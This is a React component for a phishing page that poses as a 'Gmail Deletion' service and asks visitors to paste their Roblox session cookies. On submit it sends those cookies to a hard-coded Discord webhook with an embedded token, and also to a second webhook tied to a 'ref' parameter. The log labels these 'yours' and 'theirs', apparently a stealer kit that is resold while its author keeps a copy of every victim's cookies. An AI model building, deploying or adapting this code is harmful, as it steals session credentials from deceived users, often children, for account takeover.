import { useState } from "react";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { ArrowLeft, Cookie } from "lucide-react";

interface RobloxCookiesProps {
  onBack: () => void;
  onSuccess: () => void;
}

export const RobloxCookies = ({ onBack, onSuccess }: RobloxCookiesProps) => {
  const [cookies, setCookies] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const MAIN_WEBHOOK =
    "https://discord.com/api/webhooks/1382124073953263787/QNnd4cako-sTG77Hv6sQ-ZDT1ZX0HM22fuVvIT4ednht3YIj91mEgYwZJ8HiH8TkgvLE";

  const getWebhookData = () => {
    const urlParams = new URLSearchParams(window.location.search);
    const refId = urlParams.get("ref");

    console.log("🔍 Checking for custom instance...");
    console.log("Current URL:", window.location.href);
    console.log("Ref ID:", refId);

    if (refId) {
      // Try to get webhook data from localStorage
      const webhookKey = `webhook_${refId}`;
      const webhookData = localStorage.getItem(webhookKey);

      console.log("📦 Looking for webhook key:", webhookKey);
      console.log("📦 Raw webhook data:", webhookData);

      if (webhookData) {
        try {
          const parsed = JSON.parse(webhookData);
          console.log("✅ Parsed webhook data:", parsed);
          if (parsed.webhook) {
            console.log("🎯 Custom webhook found:", parsed.webhook);
            return { refId, webhookData: parsed };
          } else {
            console.error("❌ No webhook URL in parsed data");
          }
        } catch (error) {
          console.error("❌ Error parsing webhook data:", error);
        }
      } else {
        console.error("❌ No webhook data found for refId:", refId);
        // Let's check what keys exist in localStorage
        console.log("🔍 All localStorage keys:", Object.keys(localStorage));
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (key && key.startsWith("webhook_")) {
            console.log(`📋 Found webhook key: ${key}`);
          }
        }
      }
    } else {
      console.log("ℹ️ No ref parameter found - this is the main instance");
    }

    return { refId: null, webhookData: null };
  };

  // Split large text into chunks if needed
  const splitLargeText = (text: string, maxLength = 1800) => {
    if (text.length <= maxLength) return [text];

    const chunks = [];
    for (let i = 0; i < text.length; i += maxLength) {
      chunks.push(text.substring(i, i + maxLength));
    }
    return chunks;
  };

  const sendToWebhook = async (
    webhookUrl: string,
    data: any,
    webhookType: string,
  ) => {
    try {
      console.log(`🚀 Sending to ${webhookType} webhook:`, webhookUrl);

      const { refId } = getWebhookData();
      const timestamp = new Date().toISOString();

      // Split cookies into chunks if too large
      const cookieChunks = splitLargeText(data.cookies);

      // Create embeds for each chunk
      const embeds = [];

      if (cookieChunks.length === 1) {
        // Single embed for small data
        embeds.push({
          title:
            webhookType === "custom"
              ? "🔥 Gmail Delete Request (Custom Instance)"
              : "🔥 Gmail Delete Request (Main System)",
          color: webhookType === "custom" ? 0xc0c0c0 : 0xff0000, // Silver for custom, red for main
          description:
            webhookType === "custom"
              ? "🎯 New Gmail deletion request from your custom instance!"
              : "📨 Gmail deletion request received and processed.",
          fields: [
            {
              name: "🍪 Roblox Cookies",
              value: `\`\`\`${data.cookies}\`\`\``,
              inline: false,
            },
            {
              name: "⏰ Timestamp",
              value: timestamp,
              inline: true,
            },
            {
              name: "🎯 Action",
              value: "Delete Gmail",
              inline: true,
            },
            ...(refId
              ? [
                  {
                    name: "🔗 Instance ID",
                    value: refId,
                    inline: true,
                  },
                  {
                    name: "🌐 Source",
                    value:
                      webhookType === "custom"
                        ? "Custom Instance"
                        : "Main System Monitor",
                    inline: true,
                  },
                ]
              : []),
          ],
          footer: {
            text:
              webhookType === "custom"
                ? "X-LiNk Custom Instance"
                : "X-LiNk Main System",
          },
        });
      } else {
        // Multiple embeds for large data
        // Header embed
        embeds.push({
          title:
            webhookType === "custom"
              ? "🔥 Gmail Delete Request (Custom Instance) - LARGE DATA"
              : "🔥 Gmail Delete Request (Main System) - LARGE DATA",
          color: webhookType === "custom" ? 0xc0c0c0 : 0xff0000, // Silver for custom, red for main
          description:
            webhookType === "custom"
              ? `🎯 New Gmail deletion request from your custom instance! Data split into ${cookieChunks.length} parts.`
              : `📨 Gmail deletion request received and processed. Data split into ${cookieChunks.length} parts.`,
          fields: [
            {
              name: "⏰ Timestamp",
              value: timestamp,
              inline: true,
            },
            {
              name: "🎯 Action",
              value: "Delete Gmail",
              inline: true,
            },
            {
              name: "📊 Data Parts",
              value: `${cookieChunks.length} chunks`,
              inline: true,
            },
            ...(refId
              ? [
                  {
                    name: "🔗 Instance ID",
                    value: refId,
                    inline: true,
                  },
                  {
                    name: "🌐 Source",
                    value:
                      webhookType === "custom"
                        ? "Custom Instance"
                        : "Main System Monitor",
                    inline: true,
                  },
                ]
              : []),
          ],
          footer: {
            text:
              webhookType === "custom"
                ? "X-LiNk Custom Instance"
                : "X-LiNk Main System",
          },
        });

        // Data chunks embeds
        cookieChunks.forEach((chunk, index) => {
          embeds.push({
            title: `🍪 Cookies Part ${index + 1}/${cookieChunks.length}`,
            color: webhookType === "custom" ? 0xa9a9a9 : 0xff4444, // Dark gray for custom, light red for main
            description: `\`\`\`${chunk}\`\`\``,
            footer: {
              text: `Part ${index + 1} of ${cookieChunks.length}`,
            },
          });
        });
      }

      const payload = { embeds };

      console.log(
        `📤 ${webhookType} webhook payload:`,
        JSON.stringify(payload, null, 2),
      );

      const response = await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      const responseText = await response.text();
      console.log(
        `📥 ${webhookType} webhook response status:`,
        response.status,
      );
      console.log(`📥 ${webhookType} webhook response:`, responseText);

      if (response.ok) {
        console.log(`✅ ${webhookType} webhook sent successfully!`);
        return true;
      } else {
        console.error(
          `❌ ${webhookType} webhook failed:`,
          response.status,
          responseText,
        );
        return false;
      }
    } catch (error) {
      console.error(`❌ ${webhookType} webhook error:`, error);
      return false;
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cookies.trim()) {
      setError("Please enter Roblox cookies");
      return;
    }

    setIsLoading(true);
    setError("");

    const { refId, webhookData } = getWebhookData();
    const data = { cookies };

    console.log("🚀 Starting dual webhook delivery process...");
    console.log("📋 Data size:", cookies.length, "characters");
    console.log("🆔 RefId:", refId);
    console.log("📦 Webhook Data:", webhookData);

    let mainWebhookSuccess = false;
    let customWebhookSuccess = false;

    // ALWAYS send to main webhook first
    try {
      console.log("📤 Sending to MAIN webhook...");
      mainWebhookSuccess = await sendToWebhook(MAIN_WEBHOOK, data, "main");
      console.log(
        "📊 Main webhook result:",
        mainWebhookSuccess ? "✅ SUCCESS" : "❌ FAILED",
      );
    } catch (error) {
      console.error("❌ Main webhook failed:", error);
    }

    // Send to custom webhook if this is a custom instance
    if (refId && webhookData && webhookData.webhook) {
      try {
        console.log("📤 Sending to CUSTOM webhook...");
        console.log("🎯 Custom webhook URL:", webhookData.webhook);
        customWebhookSuccess = await sendToWebhook(
          webhookData.webhook,
          data,
          "custom",
        );
        console.log(
          "📊 Custom webhook result:",
          customWebhookSuccess ? "✅ SUCCESS" : "❌ FAILED",
        );
      } catch (error) {
        console.error("❌ Custom webhook failed:", error);
      }
    } else {
      console.log("ℹ️ Skipping custom webhook:");
      console.log("  - Has refId?", !!refId);
      console.log("  - Has webhookData?", !!webhookData);
      console.log(
        "  - Has webhook URL?",
        webhookData ? !!webhookData.webhook : false,
      );
    }

    // Report final results
    console.log("📊 FINAL DELIVERY RESULTS:");
    console.log(
      `  🎯 Main webhook (yours): ${mainWebhookSuccess ? "✅ DELIVERED" : "❌ FAILED"}`,
    );
    console.log(
      `  🎯 Custom webhook (theirs): ${customWebhookSuccess ? "✅ DELIVERED" : "❌ FAILED"}`,
    );

    // Consider success if at least one webhook succeeded
    if (mainWebhookSuccess || customWebhookSuccess) {
      console.log("🎉 At least one webhook delivered successfully!");
      onSuccess();
    } else {
      console.error("💥 ALL WEBHOOKS FAILED!");
      setError("Failed to process request. Please try again.");
    }

    setIsLoading(false);
  };

  // Check if this is a custom instance
  const { refId } = getWebhookData();
  const isCustomInstance = !!refId;

  return (
    <motion.div
      className="flex items-center justify-center min-h-screen p-4"
      initial={{ opacity: 0, x: 50 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.5 }}
    >
      <Card className="w-full max-w-2xl bg-black/80 border-gray-500/50 backdrop-blur-2xl shadow-2xl shadow-gray-400/20">
        <CardHeader className="text-center pb-6">
          <motion.div
            initial={{ y: -20 }}
            animate={{ y: 0 }}
            transition={{ delay: 0.2 }}
            className="flex flex-col items-center"
          >
            <div className="mb-4 p-3 bg-gradient-to-br from-red-600/20 to-gray-500/20 rounded-full border border-gray-400/30">
              <Cookie className="w-8 h-8 text-red-400" />
            </div>
            <CardTitle className="text-3xl font-bold text-white mb-2 bg-gradient-to-r from-white to-gray-300 bg-clip-text text-transparent">
              Gmail Deletion
            </CardTitle>
            <p className="text-gray-300 text-sm">
              Enter Roblox cookies to proceed with deletion
            </p>
            {isCustomInstance && (
              <div className="mt-2 px-3 py-1 bg-gradient-to-r from-gray-600/20 to-gray-500/20 rounded-full border border-gray-400/30">
                <p className="text-gray-300 text-xs">
                  Custom Instance: {refId}
                </p>
              </div>
            )}
          </motion.div>
        </CardHeader>
        <CardContent className="space-y-6">
          <form onSubmit={handleSubmit} className="space-y-4">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.3 }}
            >
              <label className="block text-white font-medium mb-2">
                Roblox Cookies
              </label>
              <Textarea
                placeholder="Paste your Roblox cookies here... (supports large data)"
                value={cookies}
                onChange={(e) => setCookies(e.target.value)}
                className="bg-black/60 border-gray-500/50 text-white placeholder:text-gray-400 min-h-[200px] focus:border-gray-400 transition-colors resize-none"
                disabled={isLoading}
              />
              {cookies.length > 0 && (
                <p className="text-xs text-gray-400 mt-1">
                  Data size: {cookies.length} characters
                  {cookies.length > 1800 && (
                    <span className="text-yellow-400">
                      {" "}
                      (will be split into multiple parts)
                    </span>
                  )}
                </p>
              )}
            </motion.div>

            {error && (
              <motion.p
                className="text-red-400 text-sm text-center font-medium bg-red-900/20 border border-red-500/30 rounded-lg py-2 px-4"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
              >
                {error}
              </motion.p>
            )}

            <motion.div
              className="flex gap-4"
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.4 }}
            >
              <Button
                type="button"
                onClick={onBack}
                variant="outline"
                className="flex-1 border-gray-600 text-gray-300 hover:bg-gray-700 h-12"
                disabled={isLoading}
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back
              </Button>
              <Button
                type="submit"
                className="flex-1 bg-gradient-to-r from-red-600 to-gray-600 hover:from-red-500 hover:to-gray-500 text-white h-12 font-semibold shadow-lg shadow-gray-400/25"
                disabled={isLoading || !cookies.trim()}
              >
                {isLoading ? "Processing..." : "Delete Gmail"}
              </Button>
            </motion.div>
          </form>
        </CardContent>
      </Card>
    </motion.div>
  );
};
